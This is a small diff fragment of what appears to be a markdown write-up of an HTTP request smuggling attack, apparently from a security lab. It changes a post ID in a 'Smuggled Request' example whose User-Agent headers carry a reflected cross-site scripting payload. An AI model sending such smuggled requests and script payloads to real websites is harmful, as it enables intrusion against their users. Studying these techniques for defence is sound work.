@@ -117,7 +117,7 @@ The attack consists of three stages:
 - **Smuggled Request:**  
 
 ```http
-GET /post?postId=10 HTTP/1.1
+GET /post?postId=7 HTTP/1.1
 User-Agent: yu5md"><script>alert(1)</script>hgpov
 user-agent: yu5md"><script>alert(1)</script>hgpov
 X: Y
